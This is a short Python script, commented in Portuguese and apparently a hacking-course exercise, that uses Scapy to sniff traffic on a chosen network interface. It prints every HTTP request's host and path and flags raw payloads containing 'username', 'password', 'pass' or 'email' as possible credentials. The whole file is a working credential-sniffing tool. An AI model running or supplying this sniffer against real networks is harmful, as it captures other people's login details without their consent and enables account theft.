# Shebang
#!/usr/bin/env python

# Scapy para analisar pacotes
import scapy.all as scapy
# Argument parse para pegar argumentos do terminal
import argparse

# Vamos verificar requisições HTTP
from scapy.layers import http

# Pega a interface que o usuário informou na linha de comand
def pegar_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

# Coletamos os pacotes
def sniff(iface):
    # Interface, não quero guardar cache, o que fazer ao interceptar pacotes
    scapy.sniff(iface=iface, store=False, prn=processar_pacote)

# Salvo as informações relevantes do pacote
def processar_pacote(pacote):
    if pacote.haslayer(http.HTTPRequest):
        
        print(pacote)
        print("[+] Http Request >> " + str(pacote[http.HTTPRequest].Host) + str(pacote[http.HTTPRequest].Path))
        if pacote.haslayer(scapy.Raw):
            load = str(pacote[scapy.Raw].load)
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + str(load) + "\n\n\n")
                    break

iface = pegar_interface()
sniff(iface)